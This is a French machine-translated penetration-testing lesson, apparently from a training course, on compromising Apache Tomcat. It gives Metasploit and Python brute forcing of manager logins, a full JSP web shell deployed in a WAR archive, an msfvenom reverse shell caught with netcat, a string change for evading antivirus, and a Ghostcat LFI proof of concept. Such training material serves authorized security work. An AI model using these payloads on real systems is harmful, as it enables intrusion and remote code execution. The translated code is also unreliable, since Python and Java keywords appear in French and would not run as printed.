Attaquer Tomcat
================

* * * * *

Nous avons identifié qu'il existe bel et bien un hôte Tomcat exposé en externe par notre client. Comme la portée de l'évaluation est relativement petite et que toutes les autres cibles ne sont pas particulièrement intéressantes, portons toute notre attention sur la tentative d'obtenir un accès interne via Tomcat.

Comme indiqué dans la section précédente, si nous pouvons accéder aux points de terminaison `/manager` ou `/host-manager` , nous pouvons probablement exécuter du code à distance sur le serveur Tomcat. Commençons par forcer brutalement la page du gestionnaire Tomcat sur l'instance Tomcat à `http://web01.inlanefreight.local:8180`. Nous pouvons utiliser le [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) module Metasploit à ces fins, Burp Suite Intruder ou n'importe quel nombre de scripts pour y parvenir. Nous utiliserons Metasploit pour nos besoins.

* * * * *

Tomcat Manager - Connexion Brute Force
----------------------------------

Nous devons d'abord définir quelques options. Encore une fois, nous devons spécifier le vhost et l'adresse IP de la cible pour interagir correctement avec la cible. Nous devons également définir `STOP_ON_SUCCESS` sur `true` afin que l'analyseur s'arrête lorsque nous obtenons une connexion réussie, inutile de générer des charges de demandes supplémentaires après une connexion réussie.

```
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > définir VHOST web01.inlanefreight.local
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > définir RPORT 8180
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > définir stop_on_success true
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > définir les rhosts 10.129.201.58

```

Comme toujours, nous vérifions que tout est correctement configuré en  `afficher les options`.

```
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > afficher les options

Options du module (auxiliaire/scanner/http/tomcat_mgr_login) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    BLANK_PASSWORDS false non Essayez des mots de passe vides pour tous les utilisateurs
    BRUTEFORCE_SPEED 5 oui À quelle vitesse bruteforce, de 0 à 5
    DB_ALL_CREDS false non Essayer chaque couple utilisateur/mot de passe stocké dans la base de données courante
    DB_ALL_PASS false non Ajouter tous les mots de passe de la base de données actuelle à la liste
    DB_ALL_USERS false non Ajouter tous les utilisateurs de la base de données actuelle à la liste
    PASSWORD non Le mot de passe HTTP à spécifier pour l'authentification
    PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt non Fichier contenant les mots de passe, un par ligne
    Proxies non Une chaîne de proxy au format type:host:port[,type:host:port][...]
    RHOSTS 10.129.201.58 oui Le ou les hôtes cibles, l'identifiant CIDR de la plage ou le fichier d'hôtes avec la syntaxe 'file:<path>'
    RPORT 8180 oui Le port cible (TCP)
    SSL false non Négocier SSL/TLS pour les connexions sortantes
    STOP_ON_SUCCESS vrai oui Arrêtez de deviner quand un identifiant fonctionne pour un hôte
    TARGETURI /manager/html oui URI pour la connexion au gestionnaire. La valeur par défaut est /manager/html
    THREADS 1 oui Le nombre de threads simultanés (un maximum par hôte)
    USERNAME non Le nom d'utilisateur HTTP à spécifier pour l'authentification
    USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt non Fichier contenant les utilisateurs et les mots de passe séparés par un espace, une paire par ligne
    USER_AS_PASS false non Essayez le nom d'utilisateur comme mot de passe pour tous les utilisateurs
    USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt non Fichier contenant les utilisateurs, un par ligne
    VERBOSE vraioui s'il faut imprimer la sortie pour toutes les tentatives
    VHOST web01.inlanefreight.local non Hôte virtuel du serveur HTTP

```

Nous appuyons sur `run` et obtenons un résultat pour la paire d'informations d'identification `tomcat:admin`.

```
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > exécuter

[!] No active DB -- Les données d'identification ne seront pas enregistrées !
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : admin (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : root (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : vagabond (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : administrateur (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : racine (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : s3cret (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : vagabond (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : administrateur (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : racine (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : role1:s3cret (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : vagabond (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : root : admin (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : racine : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : racine : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : racine : racine (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : racine : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : root : s3cret (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : racine : vagabond (incorrect)
[+] 10.129.201.58:8180 - Connexion réussie : tomcat:admin
[*] Scanné 1 des 1 hôtes (100% complet)
[*] Exécution du module auxiliaire terminée

```

Il est important de noter qu'il existe de nombreux outils à notre disposition en tant que testeurs d'intrusion. Beaucoup existent pour rendre notre travail plus efficace, d'autant plus que la plupart des tests d'intrusion sont "time-boxed" ou soumis à des contraintes de temps strictes. Aucun outil n'est meilleur qu'un autre, et cela ne fait pas de nous un "mauvais" testeur d'intrusion si nous utilisons certains outils comme Metasploit à notre avantage. À condition que nous comprenions chaque scanner et script d'exploitation que nous exécutons et les risques, l'utilisation correcte de ce scanner n'est pas différente de l'utilisation de Burp Intruder ou de l'écriture d'un script Python personnalisé. Certains disent : "travaillez plus intelligemment, pas plus dur". Pourquoi ferions-nous un travail supplémentaire pour nous-mêmes lors d'une évaluation de 40 heures avec 1 500 hôtes concernés alors que nous pouvons utiliser un outil particulier pour nous aider ? Il est essentiel pour nous de comprendre `comment` nos outils fonctionnent et comment faire beaucoup de choses manuellement. Nous pourrions essayer manuellement chaque paire d'informations d'identification dans le navigateur ou le script en utilisant `cURL` ou Python si nous le souhaitons. À tout le moins, si nous décidons d'utiliser un certain outil, nous devrions être en mesure d'expliquer son utilisation et son impact potentiel à nos clients s'ils nous interrogent pendant ou après l'évaluation.

Disons qu'un module Metasploit particulier (ou un autre outil) échoue ou ne se comporte pas comme nous le pensons. Nous pouvons toujours utiliser Burp Suite ou ZAP pour proxy le trafic et dépanner. Pour ce faire, lancez d'abord Burp Suite, puis définissez l'option `PROXIES` comme suit :

```
msf6 auxiliaire (scanner/http/tomcat_mgr_login) > définir PROXYS HTTP:127.0.0.1:8080

PROXY => HTTP:127.0.0.1:8080

msf6 auxiliaire (scanner/http/tomcat_mgr_login) > exécuter

[!] No active DB -- Les données d'identification ne seront pas enregistrées !
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : admin (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : root (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : admin : vagabond (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : administrateur (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : gestionnaire (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : rôle1 (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : racine (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : tomcat (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : s3cret (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : gestionnaire : vagabond (incorrect)
[-] 10.129.201.58:8180 - ÉCHEC DE LA CONNEXION : rôle1 : administrateur (incorrect)

```

Nous pouvons voir dans Burp exactement comment le scanner fonctionneg, en tenant compte de chaque paire d'informations d'identification et de l'encodage base64 pour l'authentification de base utilisée par Tomcat.

![image](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Une vérification rapide de la valeur dans l'en-tête `Authorization` pour une requête montre que l'analyseur fonctionne correctement, encodant en base64 les informations d'identification `admin:vagrant` comme le ferait l'application Tomcat lorsqu'un utilisateur tente de se connecter directement à partir du Web. application. Essayez ceci pour quelques exemples tout au long de ce module pour commencer à vous familiariser avec le débogage via un proxy.

```
dsgsec@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d

administrateur : vagabond

```

Nous pouvons également utiliser [ce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) script Python pour obtenir le même résultat.

Code : python

```
#!/usr/bin/python

demandes d'importation
de termcolor import cprint
importer l'analyse d'arguments

parser = argparse.ArgumentParser(description = "Tomcat manager ou host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL vers la page Tomcat")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager ou host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Fichiers de mots de passe")

args = analyseur.parse_args()

url = args.url
uri = args.chemin
fichiers_utilisateurs = args.nomsutilisateurs
passwords_file = args.passwords

nouvelle_url = url + uri
f_users = open(fichier_utilisateurs, "rb")
f_pass = open(passwords_file, "rb")
noms d'utilisateur = [x.strip() pour x dans f_users]
mots de passe = [x.strip() pour x dans f_pass]

cprint("\n[+] Attaque....", "rouge", attrs = ['gras'])

pour vous dans les noms d'utilisateur :
     pour p dans les mots de passe :
         r = demandes.get(nouvelle_url,auth = (u, p))

         si r.status_code == 200 :
             cprint("\n[+] Succès !!", "vert", attrs = ['gras'])
             cprint("[+] Nom d'utilisateur : {}\n[+] Mot de passe : {}".format(u,p), "vert", attrs = ['gras'])
             casser
     si r.status_code == 200 :
         casser

si r.status_code != 200 :
     cprint("\n[+] Échec !!", "rouge", attrs = ['gras'])
     cprint("[+] Impossible de trouver les crédits :( ", "red", attrs = ['bold'])
#print r.status_code

```

C'est un script très simple qui prend quelques arguments. Nous pouvons exécuter le script avec `-h` pour voir ce dont il a besoin pour s'exécuter.

```
dsgsec@htb[/htb]$ python3 mgr_brute.py -h

utilisation : mgr_brute.py [-h] -U URL -P CHEMIN -u NOM D'UTILISATEUR -p MOT DE PASSE

Bruteforcing des informations d'identification du gestionnaire Tomcat ou du gestionnaire d'hôte

arguments facultatifs :
   -h, --help affiche ce message d'aide et quitte
   -U URL, --url URL URL vers la page Tomcat
   -P PATH, --path PATH gestionnaire ou URI du gestionnaire d'hôte
   -u NOMS D'UTILISATEUR, --usernames NOMS D'UTILISATEUR
                         Fichier des utilisateurs
   -p MOTS DE PASSE, --passwords MOTS DE PASSE
                         Fichiers de mots de passe

```

Nous pouvons essayer le script avec le fichier d'utilisateurs et de mots de passe Tomcat par défaut utilisé par le module Metasploit ci-dessus. Nous l'exécutons et obtenons un coup!

```
dsgsec@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Attaquer.....

[+] Succès !!
[+] Pseudo : b'tomcat'
[+] Mot de passe : b'admin'

```

Si vous êtes intéressé par les scripts, consultez les modules [Introduction to Python 3](https://academy.hackthebox.com/course/preview/introduction-to-python-3) et [Introduction to Bash Scripting](https: //academy.hackthebox.com/course/preview/introduction-to-bash-scripting). Un exercice intéressant serait de créer nos propres scripts de connexion par force brute Tomcat Manager en utilisant Python et Bash, mais nous vous laisserons cet exercice.

* * * * *

Gestionnaire Tomcat - Téléchargement de fichiers WAR
--------------------------------

De nombreuses installations Tomcat fournissent une interface graphique pour gérer l'application. Cette interface est disponible sur `/manager/html` par défaut, à laquelle seuls les utilisateurs auxquels le rôle `manager-gui` a été attribué sont autorisés à accéder. Des informations d'identification de gestionnaire valides peuvent être utilisées pour télécharger une application Tomcat packagée (fichier .WAR) et compromettre l'application. Un WAR, ou Web Application Archive, est utilisé pour déployer rapidement des applications Web et un stockage de sauvegarde.

Après avoir effectué une attaque par force brute et répondu aux questions 1 et 2 ci-dessous, accédez à `http://web01.inlanefreight.local:8180/manager/html` et saisissez les informations d'identification.

![](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)

L'application Web du gestionnaire nous permet de déployer instantanément de nouvelles applications en téléchargeant des fichiers WAR. Un fichier WAR peut être créé à l'aide de l'utilitaire zip. Un shell Web JSP tel que [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) peut être téléchargé et placé dans l'archive.

Code : java

```
<%@ page import="java.util.*,java.io.*"%>
< %
//
// JSP_KIT
//
// cmd.jsp = Exécution de la commande (unix)
//
// par : Inconnu
// modifié : 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="monformulaire" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="soumettre" VALUE="Envoyer">
</FORM>
<pré>
< %
si (request.getParameter("cmd") != null) {
         out.println("Commande : " + request.getParameter("cmd") + "<BR>");
         Processus p = Runtime.getRuntime().exec(request.getParameter("cmd"));
         OutputStream os = p.getOutputStream();
         InputStream in = p.getInputStream();
         DataInputStream dis = new DataInputStream(in);
         Chaîne disr = dis.readLine();
         tandis que ( disr != null ) {
                 out.println(disr);
                 disr = dis.readLine();
                 }
         }
%>
</pre>
</BODY></HTML>

```

```
dsgsec@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
dsgsec@htb[/htb]$ zip -r backup.war cmd.jsp

   ajout : cmd.jsp (dégonflé à 81 %)

```

Cliquez sur `Browse` pour sélectionner le fichier .war, puis cliquez sur `Deploy`.

![image](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Ce fichier est chargé dans l'interface graphique du gestionnaire, après quoi l'application `/backup` sera ajoutée au tableau.

![](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

Si nous cliquons sur `backup`, nous serons redirigés vers `http://web01.inlanefreight.local:8180/backup/` et obtiendrons une erreur `404 Not Found` . Nous devons également spécifier le fichier `cmd.jsp` dans l'URL. La navigation sur `http://web01.inlanefreight.local:8180/backup/cmd.jsp` nous présentera un shell Web que nous pouvons utiliser pour exécuter des commandes sur le serveur Tomcat. À partir de là, nous pourrions mettre à niveau notre shell Web vers un shell inversé interactif et continuer. Comme dans les exemples précédents, nous pouvons interagir avec ce shell Web via le navigateur ou en utilisant `cURL` sur la ligne de commande. Essayez les deux !

```
dsgsec@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="monformulaire" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="soumettre" VALUE="Envoyer">
</FORM>
<pré>
Commande : id<BR>
uid=1001(tomcat) gid=1001(tomcat) groupes=1001(tomcat)

</pre>
</BODY></HTML>

```

Pour nettoyer après nous-mêmes, nous pouvons revenir à la page principale de Tomcat Manager et cliquer sur le bouton `Undeploy` à côté de l'application `backups` après, bien sûr, avoir noté le fichier et l'emplacement de téléchargement de notre rapport, qui dans notre exemple est `/opt/tomcat/apache-tomcat-10.0.10/webapps`. Si nous faisons un `ls` sur ce répertoire à partir de notre shell Web, nous verrons le fichier `backup.war` téléchargé et le répertoire `backup` contenant le script `cmd.jsp` et `META-INF` créés après le l'application se déploie. Cliquer sur `Undeploy` supprimera généralement l'archive WAR téléchargée et le répertoire associé à l'application.

Nous pourrions également utiliser `msfvenom` pour générer un fichier WAR malveillant. La charge utile [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) exécutera un reverse shell via un fichier JSP. Accédez à la console Tomcat et déployez ce fichier. Tomcat extrait automatiquement le contenu du fichier WAR et le déploie.

```
dsgsec@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Taille de la charge utile : 1 098 octets
Taille finale du fichier war : 1098 octets

```

Démarrez un écouteur Netcat et cliquez sur `/backup` pour exécuter le shell.

```
dsgsec@htb[/htb]$ nc -lnvp 4443

écoute sur [tout] 4443 ...
se connecter à [10.10.14.15] depuis (INCONNU) [10.129.201.58] 45224

identifiant

uid=1001(tomcat) gid=1001(tomcat) groupes=1001(tomcat)

```

Le [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) module Metasploit peut être utilisé pour automatiser le processus illustré ci-dessus, mais nous laisserons cela comme exercice pour le lecteur.

[Ce](https://github.com/SecurityRiskAdvisors/cmd.jsp) Le shell Web JSP est très léger (moins de 1 Ko) et utilise un [Bookmarklet](https://www.freecodecamp.org/news/what-are -bookmarklets/) ou un signet de navigateur pour exécuter le code JavaScript nécessaire à la fonctionnalité du shell Web et de l'interface utilisateur. Sans cela, la navigation vers un `cmd.jsp` téléchargé n'afficherait rien. C'est une excellente option pour minimiser notre empreinte et éventuellement échapper aux détections des shells Web JSP standard (bien que le code JSP doive être légèrement modifié).

Le shell Web tel quel n'est détecté que par 2/58 fournisseurs d'antivirus.

![image](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un changement simple comme changer :

Code : java

```
FileOutputStream(f);stream.write(m);o="Téléchargé :

```

pour:

Code : java

```
FileOutputStream(f);stream.write(m);o="uPlOaDeD :

```

au moment de la rédaction, 0 fournisseur de sécurité sur 58 signale le fichier `cmd.jsp` comme malveillant.

* * * * *

Une note rapide sur les shells Web
--------------------------

Lorsque nous téléchargeons des shells Web (en particulier sur des externes), nous voulons empêcher tout accès non autorisé. Nous devrions prendre certaines mesures telles qu'un nom de fichier aléatoire (c'est-à-dire un hachage MD5), limiter l'accès à notre adresse IP source, et même password le protéger. Nous ne voulons pas qu'un attaquant tombe sur notre shell Web et l'exploite pour s'implanter.

* * * * *

CVE-2020-1938 : Chat fantôme
------------------------

Tomcat s'est avéré vulnérable à une LFI non authentifiée dans une découverte semi-récente nommée [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). Toutes les versions de Tomcat antérieures à 9.0.31, 8.5.51 et 7.0.100 ont été jugées vulnérables. Cette vulnérabilité a été causée par une mauvaise configuration du protocole AJP utilisé par Tomcat. AJP signifie Apache Jserv Protocol, qui est un protocole binaire utilisé pour les requêtes proxy. Ceci est généralement utilisé pour envoyer des requêtes par proxy aux serveurs d'applications derrière les serveurs Web frontaux.

Le service AJP s'exécute généralement sur le port 8009 sur un serveur Tomcat. Cela peut être vérifié avec un scan Nmap ciblé.

```
dsgsec@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

À partir de Nmap 7.80 ( https://nmap.org ) au 2021-09-21 20:05 EDT
Rapport d'analyse Nmap pour app-dev.inlanefreight.local (10.129.201.58)
L'hôte est actif (latence de 0,14 s).

VERSION SERVICE À L'ÉTAT DU PORT
8009/tcp open ajp13 Apache Jserv (Protocole v1.3)
8080/tcp ouvrir http Apache Tomcat 9.0.30

Détection de service effectuée. Veuillez signaler tout résultat incorrect sur https://nmap.org/submit/ .
Nmap terminé : 1 adresse IP (1 hôte actif) scannée en 9,36 secondes

```

L'analyse ci-dessus confirme que les ports 8080 et 8009 sont ouverts. Le code PoC de la vulnérabilité est disponible [ici](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Téléchargez le script et enregistrez-le localement. L'exploit ne peut lire que les fichiers et les dossiers du dossier des applications Web, ce qui signifie que les fichiers tels que `/etc/passwd` ne sont pas accessibles. Essayons d'accéder au fichier web.xml.

```
dsgsec@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

Obtenir des ressources sur ajp13://app-dev.inlanefreight.local:8009/asdf
-------------------------------------
<?xml version="1.0" encoding="UTF-8" ?>
<!--
  Licence accordée à Apache Software Foundation (ASF) sous un ou plusieurs
   accords de licence de contributeur. Voir le fichier NOTICE distribué avec
   ce travail pour des informations supplémentaires concernant la propriété des droits d'auteur.
   L'ASF vous concède ce fichier sous la licence Apache, version 2.0
   (la licence"); vous ne pouvez pas utiliser ce fichier sauf en conformité avec
   la licence. Vous pouvez obtenir une copie de la licence à

       http://www.apache.org/licenses/LICENSE-2.0

   Sauf si requis par la loi applicable ou convenu par écrit, le logiciel
   distribué sous la Licence est distribué sur une BASE "TEL QUEL",
   SANS GARANTIE OU CONDITION D'AUCUNE SORTE, expresse ou implicite.
   Consultez la licence pour connaître les autorisations spécifiques à la langue et
   limitations en vertu de la Licence.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                       http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
   version="4.0"
   metadata-complete="true">

   <display-name>Bienvenue dans Tomcat</display-name>
   <description>
      Bienvenue sur Tomcat
   </description>

</web-app>

```

Dans certaines installations de Tomcat, nous pouvons être en mesure d'accéder à des données sensibles dans le fichier WEB-INF.

* * * * *

Passer à autre chose
---------

Tomcat est toujours une excellente trouvaille sur les tests de pénétration internes et externes. Chaque fois que nous le rencontrons, nous devons tester la zone Tomcat Manager pour les informations d'identification faibles/par défaut. Si nous pouvons nous connecter, nous pouvons rapidement transformer cet accès en exécution de code à distance. Il est courant de trouver Tomcat exécuté en tant qu'utilisateurs à privilèges élevés tels que SYSTEM ou root, il vaut donc toujours la peine de creuser car il pourrait nous fournir un pied privilégié sur un serveur Linux ou un serveur Windows joint à un domaine dans un environnement Active Directory.